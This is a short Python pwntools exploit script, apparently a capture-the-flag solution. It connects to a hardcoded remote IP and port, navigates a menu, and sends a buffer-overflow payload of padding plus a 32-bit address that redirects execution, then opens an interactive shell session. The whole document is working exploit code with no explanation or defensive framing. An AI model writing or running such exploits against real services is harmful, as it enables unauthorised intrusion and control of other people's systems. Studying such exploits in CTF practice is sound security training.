from pwn import *
p=remote("111.198.29.45",34516)
p.recvuntil("Your choice:")
p.send("1\n")

p.recvuntil("\n")
p.send("abc")
p.recvuntil("\n")
payload="a"*24+p32(0x08048694)+"a"*(260-24-3)+"\n"
p.send(payload)
p.interactive()
